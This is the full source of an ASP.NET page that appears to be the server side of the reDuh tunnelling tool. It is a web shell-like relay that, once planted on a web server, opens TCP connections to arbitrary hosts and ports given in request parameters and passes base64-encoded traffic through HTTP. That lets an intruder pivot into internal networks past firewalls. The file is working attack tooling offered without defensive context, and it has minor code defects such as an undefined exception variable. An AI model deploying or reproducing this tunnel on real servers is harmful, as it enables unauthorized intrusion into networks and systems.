<%@ Page language="c#" AutoEventWireup="false" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.Collections" %>
<%@ Import Namespace="System.ComponentModel" %>
<%@ Import Namespace="System.Data" %>
<%@ Import Namespace="System.Drawing" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Threading" %>
<%@ Import Namespace="System.Web" %>
<%@ Import Namespace="System.Web.SessionState" %>

<script runat="server">
public interface IThreadRunnable
{
	void Run();
}
public class SupportClass
{
	public static byte[] ToByteArray(sbyte[] sbyteArray)
	{
		byte[] byteArray = null;
		if (sbyteArray != null)
		{
			byteArray = new byte[sbyteArray.Length];
			for(int index=0; index < sbyteArray.Length; index++)
				byteArray[index] = (byte) sbyteArray[index];
		}
		return byteArray;
	}
	public static byte[] ToByteArray(String sourceString)
	{
		return System.Text.UTF8Encoding.UTF8.GetBytes(sourceString);
	}
	public static byte[] ToByteArray(Object[] tempObjectArray)
	{
		byte[] byteArray = null;
		if (tempObjectArray != null)
		{
			byteArray = new byte[tempObjectArray.Length];
			for (int index = 0; index < tempObjectArray.Length; index++)
				byteArray[index] = (byte)tempObjectArray[index];
		}
		return byteArray;
	}
	public static sbyte[] ToSByteArray(byte[] byteArray)
	{
		sbyte[] sbyteArray = null;
		if (byteArray != null)
		{
			sbyteArray = new sbyte[byteArray.Length];
			for(int index=0; index < byteArray.Length; index++)
				sbyteArray[index] = (sbyte) byteArray[index];
		}
		return sbyteArray;
	}
	public static char[] ToCharArray(sbyte[] sByteArray) 
	{
		return System.Text.UTF8Encoding.UTF8.GetChars(ToByteArray(sByteArray));
	}
	public static char[] ToCharArray(byte[] byteArray) 
	{
		return System.Text.UTF8Encoding.UTF8.GetChars(byteArray);
	}
	public static Int32 ReadInput(Stream sourceStream, sbyte[] target, int start, int count)
	{
		if (target.Length == 0)
			return 0;
		byte[] receiver = new byte[target.Length];
		int bytesRead   = sourceStream.Read(receiver, start, count);
		if (bytesRead == 0)	
			return -1;
		for(int i = start; i < start + bytesRead; i++)
			target[i] = (sbyte)receiver[i];
		return bytesRead;
	}
	public static Int32 ReadInput(TextReader sourceTextReader, sbyte[] target, int start, int count)
	{
		if (target.Length == 0) return 0;
		char[] charArray = new char[target.Length];
		int bytesRead = sourceTextReader.Read(charArray, start, count);
		if (bytesRead == 0) return -1;
		for(int index=start; index<start+bytesRead; index++)
			target[index] = (sbyte)charArray[index];
		return bytesRead;
	}
	public class ThreadClass : IThreadRunnable
	{
		private Thread threadField;
		public ThreadClass()
		{
			threadField = new Thread(new ThreadStart(Run));
		}
		public ThreadClass(String Name)
		{
			threadField = new Thread(new ThreadStart(Run));
			this.Name = Name;
		}
		public ThreadClass(ThreadStart Start)
		{
			threadField = new Thread(Start);
		}
		public ThreadClass(ThreadStart Start, String Name)
		{
			threadField = new Thread(Start);
			this.Name = Name;
		}
		public virtual void Run()
		{
		}
		public virtual void Start()
		{
			threadField.Start();
		}
		public virtual void Interrupt()
		{
			threadField.Interrupt();
		}
		public System.Threading.Thread Instance
		{
			get
			{
				return threadField;
			}
			set
			{
				threadField = value;
			}
		}
		public System.String Name
		{
			get
			{
				return threadField.Name;
			}
			set
			{
				if (threadField.Name == null)
					threadField.Name = value; 
			}
		}
		public System.Threading.ThreadPriority Priority
		{
			get
			{
				return threadField.Priority;
			}
			set
			{
				threadField.Priority = value;
			}
		}
		public bool IsAlive
		{
			get
			{
				return threadField.IsAlive;
			}
		}
		public bool IsBackground
		{
			get
			{
				return threadField.IsBackground;
			} 
			set
			{
				threadField.IsBackground = value;
			}
		}
		public void Join()
		{
			threadField.Join();
		}
		public void Join(long MiliSeconds)
		{
				threadField.Join(new TimeSpan(MiliSeconds * 10000));
		}
		public void Join(long MiliSeconds, int NanoSeconds)
		{
				threadField.Join(new System.TimeSpan(MiliSeconds * 10000 + NanoSeconds * 100));
		}
		public void Resume()
		{
			threadField.Resume();
		}
		public void Abort()
		{
			threadField.Abort();
		}
		public void Abort(Object stateInfo)
		{
				threadField.Abort(stateInfo);
		}
		public void Suspend()
		{
			threadField.Suspend();
		}
		public override String ToString()
		{
			return "Thread[" + Name + "," + Priority.ToString() + "," + "" + "]";
		}
		public static ThreadClass Current()
		{
			ThreadClass CurrentThread = new ThreadClass();
			CurrentThread.Instance = Thread.CurrentThread;
			return CurrentThread;
		}
	}
}

internal class reDuh:SupportClass.ThreadClass
{
	virtual internal int ServicePort
	{
		get
		{
			while (!servicePortBound)
			{
			}
			return servicePort;
		}
		
	}
	internal System.Net.Sockets.TcpListener srv = null;
	internal bool runServerThread = true;
	internal bool servicePortBound = false;
	internal redirectorProcessComm rPC;
	internal int servicePort = - 1;
	internal bool searchingForPort = true;
	internal System.Collections.Hashtable connectionPool = System.Collections.Hashtable.Synchronized(new System.Collections.Hashtable());
	internal System.Collections.Hashtable sequenceNumbers = System.Collections.Hashtable.Synchronized(new System.Collections.Hashtable());
	public Queue outputFromSockets = new Queue();
	internal int delay = 100;
	internal class redirectorGD:SupportClass.ThreadClass
	{
		private void  InitBlock(reDuh enclosingInstance)
		{
			this.enclosingInstance = enclosingInstance;
		}
		private reDuh enclosingInstance;
		public reDuh Enclosing_Instance
		{
			get
			{
				return enclosingInstance;
			}
			
		}
		internal System.String target = null;
		internal int port = - 1;
		internal int sockNum = - 1;
		internal System.IO.Stream fromClient = null;
		internal redirectorGD(reDuh enclosingInstance, System.String _tgt, int _prt, int _sockNum, System.IO.Stream _fromClient)
		{
			InitBlock(enclosingInstance);
			target = _tgt;
			port = _prt;
			sockNum = _sockNum;
			fromClient = _fromClient;
		}
		override public void  Run()
		{
			int bufferSize = 8000;
			sbyte[] buffer = new sbyte[bufferSize];
			int numberRead = 0;
			bool moreData = true;
			try
			{
				while (moreData)
				{
					numberRead = SupportClass.ReadInput(fromClient, buffer, 0, bufferSize);
					if (numberRead < 0)
					{
						Queue q = new Queue();
						enclosingInstance.outputFromSockets.Enqueue("[data]" + target + ":" + port + ":" + sockNum + ":*");
						moreData = false;
						enclosingInstance.connectionPool.Remove(target + ":" + port + ":" + sockNum);
					}
					else if (numberRead < bufferSize)
					{
						sbyte[] tmpBuffer = new sbyte[numberRead];
						for (int k = 0; k < numberRead; k++)tmpBuffer[k] = buffer[k];
						enclosingInstance.outputFromSockets.Enqueue("[data]" + target + ":" + port + ":" + sockNum + ":" + new System.String(SupportClass.ToCharArray(SupportClass.ToByteArray(encode(tmpBuffer)))));
					}
					else
					{
						enclosingInstance.outputFromSockets.Enqueue("[data]" + target + ":" + port + ":" + sockNum + ":" + new System.String(SupportClass.ToCharArray(SupportClass.ToByteArray(encode(buffer)))));
					}
					Thread.Sleep(1000);
				}
			}
			catch
			{
			}
			finally
			{
				enclosingInstance.outputFromSockets.Enqueue("[data]" + target + ":" + port + ":" + sockNum + ":*");
			}
		}
	}	
	internal class redirectorSD:SupportClass.ThreadClass
	{
		private void  InitBlock(reDuh enclosingInstance)
		{
			this.enclosingInstance = enclosingInstance;
		}
		private reDuh enclosingInstance;
		public reDuh Enclosing_Instance
		{
			get
			{
				return enclosingInstance;
			}
			
		}
		internal System.String target = null;
		internal int port = - 1;
		internal int sockNum = - 1;
		internal System.IO.Stream toClient = null;
		internal redirectorSD(reDuh enclosingInstance, System.String _tgt, int _prt, int _sockNum, System.IO.Stream _toClient)
		{
			InitBlock(enclosingInstance);
			target = _tgt;
			port = _prt;
			sockNum = _sockNum;
			toClient = _toClient;
		}
		override public void  Run()
		{
			System.String input = null;
			bool endOfTransmission = false;
			try
			{
				while (!endOfTransmission)
				{
					while (((Queue)enclosingInstance.connectionPool[target.ToString() + ":" + port.ToString() + ":" + sockNum.ToString()]).Count > 0)
					{
						input =((Queue) enclosingInstance.connectionPool[target.ToString() + ":" + port.ToString() + ":" + sockNum.ToString()]).Dequeue().ToString();
						System.String seqNum = input.Substring(0, (input.IndexOf(":")) - (0));
						input = input.Substring(input.IndexOf(":") + 1);
						sbyte[] tmp = null;
						int bytesReadFromHomePort = 0;
						if (String.CompareOrdinal(input, "*") != 0)
						{
							input = input.Replace(' ', '+');
							for (int k = 0; k < input.Length; k += 4)
							{
								System.String inputChunk = input.Substring(k, (k + 4) - (k));
								tmp = decode(SupportClass.ToSByteArray(SupportClass.ToByteArray(inputChunk)));
								bytesReadFromHomePort += tmp.Length;
								sbyte[] temp_sbyteArray;
								temp_sbyteArray = tmp;
								toClient.Write(SupportClass.ToByteArray(temp_sbyteArray), 0, temp_sbyteArray.Length);
							}
						}
						else
						{
							endOfTransmission = true;
							enclosingInstance.connectionPool.Remove(target + ":" + port + ":" + sockNum);
							enclosingInstance.sequenceNumbers.Remove(target + ":" + port + ":" + sockNum);
						}
					}
					Thread.Sleep(1000);
				}
			}
			catch { }
		}
	}
	internal class connHandler:SupportClass.ThreadClass
	{
		private void  InitBlock(reDuh enclosingInstance)
		{
			this.enclosingInstance = enclosingInstance;
		}
		private reDuh enclosingInstance;
		public reDuh Enclosing_Instance
		{
			get
			{
				return enclosingInstance;
			}
			
		}
		internal System.Net.Sockets.TcpClient sock = null;
		internal System.IO.StreamWriter rwP = null;
		internal System.IO.StreamReader rdP = null;
		internal System.String req = null;
		internal System.String data = null;
		internal connHandler(reDuh enclosingInstance, System.Net.Sockets.TcpClient conn)
		{
			InitBlock(enclosingInstance);
			sock = conn;
		}
		override public void  Run()
		{
			System.String tag = null;
			try
			{
				System.IO.StreamWriter temp_writer;
				NetworkStream myNetworkStream = sock.GetStream();
				rwP = new System.IO.StreamWriter(myNetworkStream, System.Text.Encoding.Default);
				rwP.AutoFlush = true;
				rdP = new System.IO.StreamReader(myNetworkStream, System.Text.Encoding.Default);
				while ((req = rdP.ReadLine()) != null)
				{
					tag = req.Substring(req.IndexOf("[") + 1, (req.IndexOf("]")) - (req.IndexOf("[") + 1));
					if (String.CompareOrdinal(tag, "getData") == 0)
					{
						if ( enclosingInstance.outputFromSockets.Count > 0)
						{
							data = enclosingInstance.outputFromSockets.Dequeue().ToString();
						}
						else
						{
							data = "[NO_NEW_DATA]";
						}
						rwP.WriteLine(data + "\r\n");
					}
					if (String.CompareOrdinal(tag, "Port") == 0)
					{
						enclosingInstance.outputFromSockets.Enqueue("[Port]" + enclosingInstance.servicePort);
					}
					else if (String.CompareOrdinal(tag, "newData") == 0)
					{
						System.String[] tokens = (req.Substring((req.IndexOf("]") + 1))).Split(':');
						System.String tgt = tokens[0];
						System.String prt = tokens[1];
						System.String sockNum = tokens[2];
						System.Int32 seqNum = System.Int32.Parse(tokens[3]);
						System.String data = tokens[4];
						if (enclosingInstance.connectionPool.ContainsKey(tgt + ":" + prt + ":" + sockNum))
						{
							if( ((Stack) enclosingInstance.sequenceNumbers[tgt.ToString() + ":" + prt.ToString() + ":" + sockNum.ToString()]).Count == 0)
							{
								((Stack) enclosingInstance.sequenceNumbers[tgt.ToString() + ":" + prt.ToString() + ":" + sockNum.ToString()]).Push(seqNum);
								((Queue) enclosingInstance.connectionPool[tgt.ToString() + ":" + prt.ToString() + ":" + sockNum.ToString()]).Enqueue(seqNum.ToString() + ":" + data.ToString());
							}
							else
							{
								int prevSeqNum = System.Convert.ToInt32((((Stack) enclosingInstance.sequenceNumbers[tgt.ToString() + ":" + prt.ToString() + ":" + sockNum.ToString()]).Peek()).ToString());
								if (prevSeqNum != (seqNum - 1))
								{
									while (prevSeqNum != (seqNum - 1))
									{
										try
										{
											Thread.Sleep(2000);
											prevSeqNum = System.Convert.ToInt32((((Stack) enclosingInstance.sequenceNumbers[tgt.ToString() + ":" + prt.ToString() + ":" + sockNum.ToString()]).Peek()).ToString());
										}
										catch{}
									}
								}
								((Stack) enclosingInstance.sequenceNumbers[tgt.ToString() + ":" + prt.ToString() + ":" + sockNum.ToString()]).Push(seqNum.ToString());
								((Queue) enclosingInstance.connectionPool[tgt.ToString() + ":" + prt.ToString() + ":" + sockNum.ToString()]).Enqueue(seqNum.ToString() + ":" + data.ToString());;
							}
						}
						else
						{
							if (String.CompareOrdinal(data, "*") != 0)
							{
								rwP.WriteLine("[Error]Trying to add data to nonexistent socket - " + tgt + ":" + prt + ":" + sockNum);
							}
						}
					}
					else if (String.CompareOrdinal(tag, "shutdown") == 0)
					{
						enclosingInstance.runServerThread = false;
						enclosingInstance.srv.Stop();
					}
					else if (String.CompareOrdinal(tag, "createSocket") == 0)
					{
						System.String tgt = req.Substring(req.IndexOf("]") + 1, (req.IndexOf((System.Char) ':')) - (req.IndexOf("]") + 1));
						int prt = System.Int32.Parse(req.Substring(req.IndexOf((System.Char) ':') + 1, (req.LastIndexOf(":")) - (req.IndexOf((System.Char) ':') + 1)));
						int sockNum = System.Int32.Parse(req.Substring(req.LastIndexOf(":") + 1));
						if (enclosingInstance.connectionPool.ContainsKey(tgt + ":" + prt + ":" + sockNum))
						{
							rwP.WriteLine("[Error]Trying to create duplicate hashmap key - " + tgt + ":" + prt + ":" + sockNum);
						}
						else
						{
							bool socketSuccess = true;
							System.Net.Sockets.TcpClient tmpSocket = null;
							try
							{
								tmpSocket = new System.Net.Sockets.TcpClient(tgt, prt);
							}
							catch (Exception ex)
							{
								rwP.WriteLine("[Error]Cannot create socket " + tgt + ":" + prt);
								socketSuccess = false;
							}
							if (socketSuccess)
							{

								Queue q_newQueueData = new Queue();;
								enclosingInstance.connectionPool.Add(tgt.ToString() + ":" + prt.ToString() + ":" + sockNum.ToString(), new Queue());;
								enclosingInstance.sequenceNumbers.Add(tgt.ToString() + ":" + prt.ToString() + ":" + sockNum.ToString(), new Stack());;
								System.IO.Stream toClient = tmpSocket.GetStream();
								System.IO.Stream fromClient = tmpSocket.GetStream();
								redirectorSD sendDataToTarget = new redirectorSD(this.enclosingInstance, tgt, prt, sockNum, toClient);
								redirectorGD getDataFromTarget = new redirectorGD(this.enclosingInstance, tgt, prt, sockNum, fromClient);
								sendDataToTarget.Start();
								getDataFromTarget.Start();
								rwP.WriteLine("[Info]Successfully created socket " + tgt + ":" + prt + " (Number " + sockNum + ")");
								sendDataToTarget.Join();
								rwP.WriteLine("[Info]Socket closed for " + tgt + ":" + prt + " (Number " + sockNum + ")");
							}
						}
					}
					break;
				}
				try
				{
					rwP.Close();
				}
				catch {}
				try
				{
					rdP.Close();
				}
				catch {}
			}
			catch (System.Exception e)
			{
				System.Console.Error.WriteLine("Service Thread Exception " + e);
				return ;
			}
		}
	}	
	internal class redirectorProcessComm:SupportClass.ThreadClass
	{
		private void  InitBlock(reDuh enclosingInstance)
		{
			this.enclosingInstance = enclosingInstance;
		}
		private reDuh enclosingInstance;
		public reDuh Enclosing_Instance
		{
			get
			{
				return enclosingInstance;
			}
			
		}
		internal System.Net.Sockets.TcpClient sock = null;
		internal System.String input = null;
		internal connHandler newConnection = null;
		internal bool boundToPort = false;
		internal redirectorProcessComm(reDuh enclosingInstance)
		{
			InitBlock(enclosingInstance);
			while (!boundToPort)
			{
				try
				{
					System.Net.Sockets.TcpListener temp_tcpListener;
					temp_tcpListener = new System.Net.Sockets.TcpListener(enclosingInstance.servicePort);
					temp_tcpListener.Start();
					enclosingInstance.srv = temp_tcpListener;
					boundToPort = true;
				}
				catch
				{
					enclosingInstance.servicePort++;
					boundToPort = false;
				}
			}
			enclosingInstance.servicePortBound = true;
		}
		override public void  Run()
		{
			while (enclosingInstance.runServerThread)
			{
				try
				{
					sock = enclosingInstance.srv.AcceptTcpClient();
				}
				catch (System.Exception e)
				{
					System.Console.Error.WriteLine("*Unable to receive connection on port " + enclosingInstance.servicePort + ". The service has probably been shutdown. " + e);
					return ;
				}
				newConnection = new connHandler(this.enclosingInstance, sock);
				newConnection.Start();
			}
			try
			{
				enclosingInstance.srv.Stop();
			}
			catch
			{
			}
		}
	}
	internal reDuh(int _p)
	{
		servicePort = _p;
	}
	override public void  Run()
	{
		try
		{
			rPC = new redirectorProcessComm(this);
			rPC.Start();
			rPC.Join();
		}
		catch
		{
		}
	}
}
String s_path = null;
int DEBUG_LEVEL = 1;
String data = null;
String action = null;
String tmpTargetPort = null;
String tmpPCPort = null;
String targetHost = null;
String cmd = null;
String socketNumber = null;
String sequenceNumber = null;
int targetPort = -1;
int servicePort = 42000;
Socket rpcSock = null;
NetworkStream myNetworkStream = null;
StreamWriter rw = null;
StreamReader rd = null;
private static sbyte[] ALPHASET = SupportClass.ToSByteArray(SupportClass.ToByteArray("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="));
private static int[] CODES = new int[256];
private const int I6O2 = 255 - 3;
private const int O6I2 = 3;
private const int I4O4 = 255 - 15;
private const int O4I4 = 15;
private const int I2O6 = 255 - 63;
private const int O2I6 = 63;
public static String encode(String s)
{
	sbyte[] sBytes = SupportClass.ToSByteArray(SupportClass.ToByteArray(s));
	sBytes = encode(sBytes);
	s = new System.String(SupportClass.ToCharArray(SupportClass.ToByteArray(sBytes)));
	return s;
}
public static System.String decode(System.String s)
{
	while (s.IndexOf("\n") > -1) s = s.Replace("\n", "");
	while (s.IndexOf("\r") > -1) s = s.Replace("\r", "");
	sbyte[] sBytes = SupportClass.ToSByteArray(SupportClass.ToByteArray(s));
	sBytes = decode(sBytes);
	s = new System.String(SupportClass.ToCharArray(SupportClass.ToByteArray(sBytes)));
	return s;
}
public static sbyte[] encode(sbyte[] dData)
{
	if (dData == null)
	{
		throw new System.ArgumentException("Cannot encode null");
	}
	sbyte[] eData = new sbyte[((dData.Length + 2) / 3) * 4];	
	int eIndex = 0;
	for (int i = 0; i < dData.Length; i += 3)
	{
		int d1;
		int d2 = 0;
		int d3 = 0;
		int e1;
		int e2;
		int e3;
		int e4;
		int pad = 0;	
		d1 = dData[i];
		if ((i + 1) < dData.Length)
		{
			d2 = dData[i + 1];
			if ((i + 2) < dData.Length)
			{
				d3 = dData[i + 2];
			}
			else
			{
				pad = 1;
			}
		}
		else
		{
			pad = 2;
		}
		e1 = ALPHASET[(d1 & I6O2) >> 2];
		e2 = ALPHASET[(d1 & O6I2) << 4 | (d2 & I4O4) >> 4];
		e3 = ALPHASET[(d2 & O4I4) << 2 | (d3 & I2O6) >> 6];
		e4 = ALPHASET[(d3 & O2I6)];
		eData[eIndex++] = (sbyte) e1;
		eData[eIndex++] = (sbyte) e2;
		eData[eIndex++] = (pad < 2)?(sbyte) e3:(sbyte) '=';
		eData[eIndex++] = (pad < 1)?(sbyte) e4:(sbyte) '=';
	}
	return eData;
}
public static sbyte[] decode(sbyte[] eData)
{
	if (eData == null)
	{
		throw new System.ArgumentException("Cannot decode null");
	}
	sbyte[] cleanEData = (sbyte[]) eData.Clone();
	int cleanELength = 0;
	for (int i = 0; i < eData.Length; i++)
	{
		if (eData[i] < 256 && CODES[eData[i]] < 64)
		{
			cleanEData[cleanELength++] = eData[i];
		}
	}
	int dLength = (cleanELength / 4) * 3;
	switch (cleanELength % 4)
	{	
		case 3: 
			dLength += 2;
			break;	
		case 2: 
			dLength++;
			break;
	}
	sbyte[] dData = new sbyte[dLength];
	int dIndex = 0;
	for (int i = 0; i < eData.Length; i += 4)
	{
		if ((i + 3) > eData.Length)
		{
			throw new System.ArgumentException("byte array is not a valid com.sun.syndication.io.impl.Base64 encoding");
		}
		int e1 = CODES[cleanEData[i]];
		int e2 = CODES[cleanEData[i + 1]];
		int e3 = CODES[cleanEData[i + 2]];
		int e4 = CODES[cleanEData[i + 3]];
		dData[dIndex++] = (sbyte) ((e1 << 2) | (e2 >> 4));
		if (dIndex < dData.Length)
		{
			dData[dIndex++] = (sbyte) ((e2 << 4) | (e3 >> 2));
		}
		if (dIndex < dData.Length)
		{
			dData[dIndex++] = (sbyte) ((e3 << 6) | (e4));
		}
	}
	return dData;
}
private void InitClassVars()
{
	for (int i=0;i<CODES.Length;i++)
	{
		CODES[i] = 64;
	}
	for (int i=0;i<ALPHASET.Length;i++)
	{
		CODES[ALPHASET[i]] = i;
	}
}
private void Page_Load(object sender, System.EventArgs e)
{
	InitClassVars();
	s_path = System.Web.HttpContext.Current.Server.MapPath(Request.ServerVariables["SCRIPT_NAME"]);
	action = Request["action"];
	cmd = Request["command"];
	targetHost = Request["targetHost"];
	tmpTargetPort = Request["targetPort"];
	if (tmpTargetPort != null)
	{
		targetPort = System.Int32.Parse(tmpTargetPort);
	}
	data = Request["data"];
	tmpPCPort = Request["servicePort"];
	if (tmpPCPort != null)
	{
		servicePort = System.Int32.Parse(tmpPCPort);
	}
	socketNumber = Request["socketNumber"];
	sequenceNumber = Request["sequenceNumber"];
	if (action == null)
	{
		Response.Write("[reDuhError] Undefined Requerst \r\n");
		Response.Flush();
	}
	else if (String.CompareOrdinal(action, "checkPort") == 0)
	{
		if (Request["port"] != null)
		{
			try
			{
				//ZZZZ STUFF HERE
				int port = System.Convert.ToInt32(Request["port"]);
				System.Net.Sockets.TcpListener temp_tcpListener;
				temp_tcpListener = new System.Net.Sockets.TcpListener(port);
				Response.Write("Success testing port " + port.ToString() + "\r\n");
				temp_tcpListener.Stop();
			}
			catch (Exception ex)
			{
				Response.Write("[Exception] " + ex.ToString());
			}
			Response.Flush();
		}
	}
	else if (String.CompareOrdinal(action, "startReDuh") == 0)
	{
		if (servicePort == -1)
		{
			Response.Write("ERROR: Bad service port - " + servicePort.ToString() + ". Did your request pass one?");
		}
		else
		{
			reDuh redirector = new reDuh(servicePort);
			redirector.Start();
			Response.Write("[Port:" + redirector.ServicePort.ToString() + "]\r\n");
			Response.Flush();
			redirector.Join();
		}
	}
	else if (String.CompareOrdinal(action, "getData") == 0)
	{
		if (servicePort == -1)
		{
			Response.Write("ERROR Bad service port - " + servicePort.ToString() + "\r\n");
			Response.Flush();
			if (DEBUG_LEVEL > 0)
			{
				System.Console.WriteLine("ERROR: Bad service port - " + servicePort);
			}
		}
		else
		{
			try
			{
				System.Net.IPHostEntry host = null;
				host = System.Net.Dns.Resolve("127.0.0.1");
				System.Net.IPAddress ipa = host.AddressList[0];
				System.Net.IPEndPoint ipe = new System.Net.IPEndPoint(ipa, servicePort);
				rpcSock = new Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				rpcSock.Connect(ipe);
				myNetworkStream = new NetworkStream(rpcSock);
				byte[] stuff = SupportClass.ToByteArray("[getData]\r\n");
				myNetworkStream.Write(stuff, 0, stuff.GetLength(0));
				rd = new System.IO.StreamReader(myNetworkStream, System.Text.Encoding.Default);
				String input = null;
				input = rd.ReadLine();
				Response.Write(input + "\r\n");
				Response.Flush();
				Thread.Sleep(1000);
				rd.Close();
				rpcSock.Close();
			}
			catch (Exception ex)
			{
			}
		}
	}
	else if (String.CompareOrdinal(action, "killReDuh") == 0)
	{
		if (servicePort == -1)
		{
			Response.Write("ERROR: Bad service port - " + servicePort.ToString() + "\r\n");
			Response.Flush();
			if (DEBUG_LEVEL > 0)
			{
				System.Console.WriteLine("ERROR: Bad service port - " + servicePort.ToString() + "\r\n");
			}
		}
		else
		{
			try
			{
				System.Net.IPHostEntry host = null;
				host = System.Net.Dns.Resolve("127.0.0.1");
				System.Net.IPAddress ipa = host.AddressList[0];
				System.Net.IPEndPoint ipe = new System.Net.IPEndPoint(ipa, servicePort);
				rpcSock = new Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				rpcSock.Connect(ipe);
				myNetworkStream = new NetworkStream(rpcSock);
				rw = new System.IO.StreamWriter(myNetworkStream, System.Text.Encoding.Default);
				rw.WriteLine("[shutdown]\r\n");
				rw.Close();
				rpcSock.Close();
				Response.Write("[Info] Shutdown complete\r\n");
				Response.Flush();
			}
			catch
			{ 
				Response.Write("[Error] Cannot connect to reDuh service on port " + servicePort.ToString() + "\r\n");
				Response.Flush();
			}
		}
	}
	else if (String.CompareOrdinal(action, "createSocket") == 0)
	{
		
		if (targetPort == -1 || targetHost == null || socketNumber == null || servicePort == -1)
		{
			Response.Write("Error: Bad port or host or socketnumber for creating new socket\r\n");
			Response.Flush();
		}
		else
		{
			try
			{
				System.Net.IPHostEntry host = null;
				host = System.Net.Dns.Resolve("127.0.0.1");
				System.Net.IPAddress ipa = host.AddressList[0];
				System.Net.IPEndPoint ipe = new System.Net.IPEndPoint(ipa, servicePort);
				rpcSock = new Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				rpcSock.Connect(ipe);
				myNetworkStream = new NetworkStream(rpcSock);
				rw = new System.IO.StreamWriter(myNetworkStream, System.Text.Encoding.Default);
				rd = new System.IO.StreamReader(myNetworkStream, System.Text.Encoding.Default);
				rw.WriteLine("[createSocket]" + targetHost + ":" + targetPort.ToString() + ":" + socketNumber.ToString() + "\r\n");
				rw.Flush();
				Response.Write(rd.ReadLine() + "\r\n");
				Response.Flush();
				rpcSock.Close();
			}
			catch (Exception ex)
			{
				Response.Write("[Error]Cannot connect to reDuh service on port " + servicePort + "\r\n");
				Response.Flush();
			}
		}
	}
	else if (String.CompareOrdinal(action, "newData") == 0)
	{
		if (targetPort == - 1 || targetHost == null || data == null || socketNumber == null || sequenceNumber == null || servicePort == - 1)
		{
			Response.Write("ERROR:Bad port, or host, or blank data for posting new data" + "\r\n");
			Response.Flush();
		}
		else
		{
			try
			{
				System.Net.IPHostEntry host = null;
				host = System.Net.Dns.Resolve("127.0.0.1");
				System.Net.IPAddress ipa = host.AddressList[0];
				System.Net.IPEndPoint ipe = new System.Net.IPEndPoint(ipa, servicePort);
				rpcSock = new Socket(System.Net.Sockets.AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				rpcSock.Connect(ipe);
				myNetworkStream = new NetworkStream(rpcSock);
				rw = new System.IO.StreamWriter(myNetworkStream, System.Text.Encoding.Default);
				rw.WriteLine("[newData]" + targetHost + ":" + targetPort + ":" + socketNumber + ":" + sequenceNumber + ":" + data + "\r\n");
				Response.Write("Caught data with sequenceNumber " + sequenceNumber + "\r\n");
				Response.Flush();
				rw.Close();
				rpcSock.Close();
			}
			catch
			{
				Response.Write("[Error]Unable to connect to reDuh.jsp main process on port " + servicePort + ". Is it running? -> " + e + "\r\n");
				Response.Flush();
			}
		}
	}
	else if (String.CompareOrdinal(action, "debug") == 0)
	{
		Response.Write("h3>DEBUG: \r\n");
		Response.Write("<h4:DEBUG END\r\n");
		Response.Flush();
	}
	else
	{
		Response.Write("[ReDuh]ERROR:Undefined action parameter\r\n");
		Response.Flush();
	}
}
override protected void OnInit(EventArgs e)
{
	InitializeComponent();
	base.OnInit(e);
}
private void InitializeComponent()
{
    Server.ScriptTimeout = 30000000;
	this.Load += new System.EventHandler(this.Page_Load);
}
</script>
